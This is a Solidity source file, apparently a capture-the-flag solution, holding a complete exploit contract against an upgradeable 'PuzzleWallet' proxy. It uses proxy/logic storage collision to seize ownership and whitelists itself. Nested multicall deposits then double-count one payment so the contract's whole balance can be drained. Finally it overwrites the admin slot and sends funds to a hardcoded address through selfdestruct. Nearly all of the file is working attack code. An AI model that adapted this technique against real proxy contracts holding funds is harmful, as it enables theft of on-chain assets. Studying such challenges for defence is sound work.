// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

//Only stuff I will need from actual proxy-abi
abstract contract PuzzleProxy is TransparentUpgradeableProxy {
    address public pendingAdmin;

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }
}


interface PuzzleWallet {
    function owner() external view returns(address);
    function maxBalance() external view returns (address);

    function init(uint256 _maxBalance) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}


contract PuzzleExploit{
    address myAddress = address(0x737e11E7A11A01891d2cB1b0A07C59A63dcd657C);
    address puzzleAddress;
    PuzzleWallet puzzleContract;
    PuzzleProxy proxyContract;

    constructor(address payable _puzzleAddress){
        puzzleAddress = _puzzleAddress;
        puzzleContract = PuzzleWallet(_puzzleAddress);
        proxyContract = PuzzleProxy(_puzzleAddress);
    }


    function pwn() public payable{
        //Match msg.value of proxy's balance, so with calling deposit twice we are later able to drain the whole balance of proxy (which will enable us to setBalance)
        require(msg.value == puzzleAddress.balance, "need to match the cash ma boy");

        //With this I become owner in delegated calls to logic contract
        proxyContract.proposeNewAdmin(address(this));

        //and can therefore whitelist myself
        puzzleContract.addToWhitelist(address(this));

        //Now its about draining the proxy so I can call setMaxBalance with my address
        //Within multicall, we will execute another multicall with the same msg.value and therefore add double our actual payment
        bytes[] memory functionCall1 = new bytes[](2);
        bytes[] memory functionCall2 = new bytes[](1);
        functionCall1[0] = abi.encodeWithSignature("deposit()");
        functionCall2[0] = abi.encodeWithSignature("deposit()");
        functionCall1[1] = abi.encodeWithSignature("multicall(bytes[])", functionCall2);
        puzzleContract.multicall{value:msg.value}(functionCall1); //Value should be exactly proxy's balance
        
        puzzleContract.execute(address(this), 2 * msg.value, abi.encodeWithSignature("pwn3()") );
        //Contract should now be drained.
        require(puzzleAddress.balance == 0, "For some reason the proxy wasnt drained.");

        //call setMaxBalance with this address casted as uint, to overwrite the 2nd slot (e.g. admin)
        uint256 castedAddress = uint256(uint160(bytes20(myAddress)));
        puzzleContract.setMaxBalance(castedAddress);
    }

    //only a method being called within execute() that will accept the payment
    function pwn3() public payable {    }

    function _selfdestruct() public {
        require(msg.sender == myAddress);
        selfdestruct(payable(myAddress));
    }
}